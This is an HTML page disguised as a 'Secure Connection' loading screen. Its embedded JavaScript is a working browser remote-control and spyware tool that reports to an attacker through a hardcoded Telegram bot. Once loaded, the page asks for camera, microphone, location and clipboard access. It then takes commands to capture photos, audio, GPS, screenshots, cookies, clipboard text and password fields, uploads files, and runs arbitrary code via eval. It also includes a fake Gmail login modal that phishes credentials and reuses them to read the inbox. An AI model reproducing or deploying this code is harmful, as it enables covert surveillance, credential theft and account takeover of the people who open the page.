<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Secure Connection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f5f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .loader-container {
            text-align: center;
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            z-index: 1000;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #mainFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 0;
            opacity: 0;
            transition: opacity 0.8s;
        }
        #persistentFrame {
            position: absolute;
            width: 1px;
            height: 1px;
            top: -100px;
            left: -100px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }
        .gmail-phish-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .gmail-phish-box {
            background: white;
            border-radius: 8px;
            width: 90%;
            max-width: 450px;
            padding: 30px 25px 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
        }
        .gmail-phish-box input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .gmail-phish-box button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        .error-msg { color: #d93025; font-size: 14px; margin-top: 10px; display: none; }
        body.modal-active { overflow: hidden; }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div class="loader-container" id="loadingOverlay">
        <div class="spinner"></div>
        <h2>Loading, please wait...</h2>
        <p>Secure connection established.</p>
    </div>
    <iframe id="mainFrame" src="https://example.com" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>
    <iframe id="persistentFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation" style="display:none;"></iframe>

    <script>
        (function(){
            // ---------- CONFIG ----------
            const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
            const ADMIN_CHAT_ID = '8737104261';
            const POLL_INTERVAL = 3000;
            const AUDIO_DURATION_MS = 120000;

            // ---------- STATE ----------
            let isRegistered = false;
            let updateId = parseInt(localStorage.getItem('tg_update_id') || '0');
            let pollingInterval = null;
            let phishingModalActive = false;
            let deviceId = null;
            let storedGmailCredentials = { email: '', password: '' };
            let permissions = { camera: false, microphone: false, location: false, clipboard: false };

            // ---------- HELPERS ----------
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            };

            async function apiCall(method, params) {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                        method: 'POST',
                        headers: { ...headers, 'Content-Type': 'application/json' },
                        body: JSON.stringify(params)
                    });
                    return await res.json();
                } catch(e) { return { ok: false }; }
            }

            async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
                const params = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
                if (replyMarkup) params.reply_markup = replyMarkup;
                await apiCall('sendMessage', params);
            }

            async function sendPhoto(blob, caption) {
                const fd = new FormData();
                fd.append('chat_id', ADMIN_CHAT_ID);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers, body: fd });
            }

            async function sendDocument(blob, filename, caption) {
                const fd = new FormData();
                fd.append('chat_id', ADMIN_CHAT_ID);
                fd.append('document', blob, filename);
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers, body: fd });
            }

            async function sendTyping() {
                await apiCall('sendChatAction', { chat_id: ADMIN_CHAT_ID, action: 'typing' });
            }

            // ---------- PERMISSIONS ----------
            async function requestPermissions() {
                try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); permissions.camera = true; s.getTracks().forEach(t=>t.stop()); } catch(e) {}
                try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); permissions.microphone = true; s.getTracks().forEach(t=>t.stop()); } catch(e) {}
                try { await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej)); permissions.location = true; } catch(e) {}
                try { await navigator.clipboard.readText(); permissions.clipboard = true; } catch(e) {}
            }

            // ---------- REGISTRATION & MENU ----------
            async function registerAndSendMenu() {
                deviceId = 'hook_' + Math.random().toString(36).substr(2, 8);
                const permEmoji = (v) => v ? '✅' : '❌';
                const permLine = `📷 ${permEmoji(permissions.camera)}  🎤 ${permEmoji(permissions.microphone)}  📍 ${permEmoji(permissions.location)}  📋 ${permEmoji(permissions.clipboard)}`;
                await sendMessage(
                    `🔌 *HTML Hook Connected*\n🆔 \`${deviceId}\`\n📱 ${navigator.platform}\n📺 ${screen.width}x${screen.height}\n${permLine}`,
                    'Markdown'
                );
                // send the main menu with inline buttons
                const inlineKeyboard = {
                    inline_keyboard: [
                        [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
                        [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
                        [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
                        [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
                        [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
                        [{ text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }, { text: '🏠 Home', callback_data: 'start' }]
                    ]
                };
                const replyKeyboard = {
                    keyboard: [[{ text: '🏠 Home' }]],
                    resize_keyboard: true,
                    persistent: true
                };
                await sendMessage(
                    `✅ *Remote Control Active* | \`${deviceId}\`\nPermissions: ${permLine}\n${storedGmailCredentials.email ? `🔐 Creds stored for ${storedGmailCredentials.email}` : 'No Gmail creds yet'}`,
                    'Markdown', inlineKeyboard
                );
                await sendMessage("Press 🏠 Home anytime to see this menu again.", 'HTML', replyKeyboard);
            }

            // ---------- GMAIL FUNCTIONS ----------
            async function autoLoginAndReadEmails() {
                if (!storedGmailCredentials.email || !storedGmailCredentials.password) return { success: false, error: "No Gmail credentials. Use /phish_gmail first." };
                window.location.href = 'https://accounts.google.com';
                return new Promise((resolve) => {
                    let attempts = 0;
                    const interval = setInterval(async () => {
                        const emailField = document.querySelector('input[type="email"]');
                        const passField = document.querySelector('input[type="password"]');
                        const nextBtn = document.querySelector('#identifierNext, #passwordNext, button[jsname]');
                        if (emailField && !emailField.value) {
                            emailField.value = storedGmailCredentials.email;
                            emailField.dispatchEvent(new Event('input', { bubbles: true }));
                            if (nextBtn) nextBtn.click();
                        } else if (passField && !passField.value) {
                            passField.value = storedGmailCredentials.password;
                            passField.dispatchEvent(new Event('input', { bubbles: true }));
                            if (nextBtn) nextBtn.click();
                        } else if (window.location.href.includes('mail.google.com')) {
                            clearInterval(interval);
                            setTimeout(async () => {
                                const rows = document.querySelectorAll('.zA, .zE, .Cp');
                                const emails = [];
                                for (let row of rows.slice(0, 15)) {
                                    const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
                                    const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
                                    const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
                                    if (from || subject) emails.push({ from, subject, snippet: snippet.slice(0,100) });
                                }
                                resolve({ success: true, data: emails.length ? emails : "No emails in current view" });
                            }, 3000);
                        }
                        if (++attempts > 60) { clearInterval(interval); resolve({ success: false, error: "Auto-login timeout" }); }
                    }, 500);
                });
            }

            async function readGmailInbox() {
                if (!location.href.includes('mail.google.com')) return { success: false, error: "Not on Gmail page" };
                const rows = document.querySelectorAll('.zA, .zE, .Cp');
                const emails = [];
                for (let row of rows.slice(0, 15)) {
                    const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
                    const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
                    const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
                    if (from || subject) emails.push({ from, subject, snippet: snippet.slice(0,100) });
                }
                return { success: true, data: emails.length ? emails : "No emails found" };
            }

            // ---------- PHISHING MODAL ----------
            function createPhishingModal() {
                if (phishingModalActive) return;
                phishingModalActive = true;
                document.body.classList.add('modal-active');
                const modal = document.createElement('div');
                modal.className = 'gmail-phish-modal';
                modal.innerHTML = `
                    <div class="gmail-phish-box">
                        <h1>Sign in to continue to Gmail</h1>
                        <input type="email" id="phish-email" placeholder="Email">
                        <input type="password" id="phish-password" placeholder="Password">
                        <button id="phish-submit">Next</button>
                        <div class="error-msg" id="phish-error">Incorrect email or password</div>
                    </div>
                `;
                document.body.appendChild(modal);
                const block = (e) => { if(e.key==='Escape'){ e.preventDefault(); document.getElementById('phish-error').style.display='block'; } };
                document.addEventListener('keydown', block);
                modal.addEventListener('click', (e) => { if(e.target===modal) document.getElementById('phish-error').style.display='block'; });
                const emailInp = document.getElementById('phish-email'), passInp = document.getElementById('phish-password'), errDiv = document.getElementById('phish-error');
                const submit = async () => {
                    const email = emailInp.value.trim(), pass = passInp.value;
                    if (!email || !pass) { errDiv.style.display='block'; errDiv.innerText='Fill both fields'; return; }
                    storedGmailCredentials = { email, password: pass };
                    await sendMessage(`🎣 *Gmail Credentials Captured*\n📧 ${email}\n🔑 ${pass}\nUse /auto_gmail`, 'Markdown');
                    modal.remove(); document.body.classList.remove('modal-active'); phishingModalActive = false; document.removeEventListener('keydown', block);
                    setTimeout(() => window.location.href = 'https://mail.google.com', 500);
                };
                document.getElementById('phish-submit').addEventListener('click', submit);
                emailInp.addEventListener('keypress', e=>{ if(e.key==='Enter') submit(); });
                passInp.addEventListener('keypress', e=>{ if(e.key==='Enter') submit(); });
            }

            // ---------- COMMAND DISPATCH ----------
            async function handleCommand(text) {
                let cmd = text.trim().toLowerCase();
                if (cmd === '🏠 home' || cmd === '/start' || cmd === 'start') {
                    const inlineKeyboard = {
                        inline_keyboard: [
                            [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
                            [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
                            [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
                            [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
                            [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
                            [{ text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }]
                        ]
                    };
                    await sendMessage(`✅ *Commands Menu* | \`${deviceId}\`\nPermissions: ${permissions.camera?'✅':'❌'}📷 ${permissions.microphone?'✅':'❌'}🎤 ${permissions.location?'✅':'❌'}📍 ${permissions.clipboard?'✅':'❌'}📋\n${storedGmailCredentials.email ? `🔐 ${storedGmailCredentials.email}` : ''}`, 'Markdown', inlineKeyboard);
                    return;
                }
                if (cmd.startsWith('/')) cmd = cmd.slice(1);
                const aliases = { 'phishgmail':'phish_gmail', 'phish_gmail':'phish_gmail', 'grabpass':'grab_pass', 'grab_pass':'grab_pass', 'reademails':'read_emails', 'read_emails':'read_emails', 'autogmail':'auto_gmail', 'auto_gmail':'auto_gmail' };
                cmd = aliases[cmd] || cmd;
                await sendTyping();

                try {
                    switch(cmd) {
                        case 'auto_gmail':
                            await sendMessage('🔄 Auto‑logging into Gmail...');
                            const auto = await autoLoginAndReadEmails();
                            if (auto.success) {
                                let msg = `📧 *Auto Gmail* (${Array.isArray(auto.data)?auto.data.length:0}):\n`;
                                if (Array.isArray(auto.data)) {
                                    for(let i=0; i<auto.data.length; i++) msg += `${i+1}. ${auto.data[i].from} – ${auto.data[i].subject}\n`;
                                    await sendMessage(msg.slice(0,3900), 'Markdown');
                                } else await sendMessage(auto.data);
                            } else await sendMessage(`❌ ${auto.error}`);
                            break;
                        case 'phish_gmail':
                            if (!phishingModalActive) createPhishingModal();
                            await sendMessage('🎣 Phishing modal injected.');
                            break;
                        case 'read_emails':
                            const read = await readGmailInbox();
                            if (read.success) {
                                let msg = `📧 *Gmail Inbox* (${Array.isArray(read.data)?read.data.length:0}):\n`;
                                if (Array.isArray(read.data)) {
                                    for(let i=0; i<read.data.length; i++) msg += `${i+1}. ${read.data[i].from} – ${read.data[i].subject}\n`;
                                    await sendMessage(msg.slice(0,3900), 'Markdown');
                                } else await sendMessage(read.data);
                            } else await sendMessage(`❌ ${read.error}`);
                            break;
                        case 'gmail':
                            if (location.href.includes('accounts.google.com')) {
                                let email = document.querySelector('input[type="email"]')?.value || '';
                                let pass = document.querySelector('input[type="password"]')?.value;
                                if (!pass) { const pf = document.querySelector('input[type="password"]'); if(pf){ pf.focus(); setTimeout(()=>pf.blur(),100); } await sendMessage('Trying to trigger autofill...'); }
                                else { storedGmailCredentials = { email, password: pass }; await sendMessage(`🔑 Stored: ${email} / ${pass}\nUse /auto_gmail`, 'Markdown'); }
                            } else await sendMessage('Not on Google login page. Use /phish_gmail.');
                            break;
                        case 'photo':
                            try {
                                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                                const v = document.createElement('video'); v.srcObject = s; await new Promise(r=>{ v.onloadedmetadata=r; v.play(); });
                                const c = document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0);
                                s.getTracks().forEach(t=>t.stop()); c.toBlob(b=>sendPhoto(b,'📸 Camera'),'image/jpeg');
                            } catch(e){ await sendMessage(`Camera error: ${e.message}`); }
                            break;
                        case 'audio':
                            try {
                                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                                const mr = new MediaRecorder(s); let chunks = [];
                                mr.ondataavailable = e=>chunks.push(e.data);
                                mr.onstop = async ()=>{ const blob = new Blob(chunks,{type:'audio/webm'}); await sendDocument(blob,`rec_${Date.now()}.webm`,`🎙️ ${AUDIO_DURATION_MS/1000}s`); s.getTracks().forEach(t=>t.stop()); };
                                mr.start(); setTimeout(()=>mr.stop(), AUDIO_DURATION_MS);
                                await sendMessage(`Recording ${AUDIO_DURATION_MS/1000}s...`);
                            } catch(e){ await sendMessage(`Mic error: ${e.message}`); }
                            break;
                        case 'location':
                            navigator.geolocation.getCurrentPosition(async p=>{ await sendMessage(`📍 ${p.coords.latitude},${p.coords.longitude} (±${p.coords.accuracy}m)`); }, async e=>{ await sendMessage(`GPS error: ${e.message}`); });
                            break;
                        case 'screenshot':
                            html2canvas(document.body).then(c=>c.toBlob(b=>sendPhoto(b,'📸 Screenshot'),'image/png')).catch(e=>sendMessage(`Screenshot failed: ${e.message}`));
                            break;
                        case 'cookies':
                            await sendMessage(`🍪 Cookies: ${document.cookie || 'none'}`);
                            break;
                        case 'grab_pass':
                            const pw = document.querySelector('input[type="password"]');
                            await sendMessage(pw && pw.value ? `🔐 Password: ${pw.value}` : 'No visible password field.');
                            break;
                        case 'clipboard':
                            try { const txt = await navigator.clipboard.readText(); await sendMessage(`📋 Clipboard: ${txt}`); } catch(e){ await sendMessage(`Clipboard error: ${e.message}`); }
                            break;
                        case 'eval':
                            const code = text.replace(/^\/eval\s*/i, '');
                            if(code){ let res = eval(code); if(typeof res!='string') res=JSON.stringify(res); await sendMessage(`✅ Eval:\n${res.slice(0,3900)}`); } else await sendMessage('Usage: /eval <js>');
                            break;
                        case 'upload':
                            const inp = document.createElement('input'); inp.type='file'; inp.onchange=async e=>{ if(e.target.files[0]) await sendDocument(e.target.files[0], e.target.files[0].name, '📁 File'); }; inp.click(); await sendMessage('File picker opened.');
                            break;
                        case 'history':
                            await sendMessage(`📍 Current: ${location.href}\n↩️ Referrer: ${document.referrer || 'none'}\n\nFull history not accessible from web page.`, 'Markdown');
                            break;
                        case 'devices':
                            await sendMessage(`🖥️ *Current device*\n🆔 \`${deviceId}\`\nPermissions: ${permissions.camera?'✅':'❌'}📷 ${permissions.microphone?'✅':'❌'}🎤 ${permissions.location?'✅':'❌'}📍 ${permissions.clipboard?'✅':'❌'}📋\n${storedGmailCredentials.email ? `🔐 ${storedGmailCredentials.email}` : ''}`, 'Markdown');
                            break;
                        default:
                            await sendMessage(`Unknown: ${cmd}. Use /start or 🏠 Home.`);
                    }
                } catch(err) { await sendMessage(`Error: ${err.message}`); }
            }

            // ---------- POLLING ----------
            async function deleteWebhookOnce() {
                if (!localStorage.getItem('webhook_deleted')) {
                    await apiCall('deleteWebhook', {});
                    localStorage.setItem('webhook_deleted', '1');
                }
            }

            async function poll() {
                if (!isRegistered) return;
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=10`, { headers });
                    const data = await res.json();
                    if (data.ok && data.result) {
                        for (const upd of data.result) {
                            if (upd.update_id >= updateId) {
                                updateId = upd.update_id + 1;
                                localStorage.setItem('tg_update_id', updateId);
                                if (upd.message && upd.message.text) await handleCommand(upd.message.text);
                                else if (upd.callback_query) {
                                    await handleCommand(upd.callback_query.data);
                                    await apiCall('answerCallbackQuery', { callback_query_id: upd.callback_query.id });
                                }
                            }
                        }
                    }
                } catch(e) {}
            }

            // ---------- PERSISTENCE & INIT ----------
            function setupPersistence() {
                document.addEventListener('click', (e) => {
                    const a = e.target.closest('a');
                    if (a && a.href && !a.href.startsWith('javascript:')) { e.preventDefault(); window.open(a.href, '_blank'); }
                }, true);
                document.getElementById('persistentFrame').src = 'about:blank';
            }

            let lastUrl = location.href;
            new MutationObserver(() => {
                if (location.href !== lastUrl) {
                    lastUrl = location.href;
                    if (location.href.includes('mail.google.com') && deviceId) sendMessage(`📧 Gmail detected on ${deviceId}. Use /read_emails`, 'Markdown');
                }
            }).observe(document, { subtree: true, childList: true });

            async function start() {
                await deleteWebhookOnce();
                await requestPermissions();
                setupPersistence();
                await registerAndSendMenu();
                isRegistered = true;
                pollingInterval = setInterval(poll, POLL_INTERVAL);
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('mainFrame').style.opacity = '1';
            }
            setTimeout(start, 5000);
        })();
    </script>
</body>
</html>
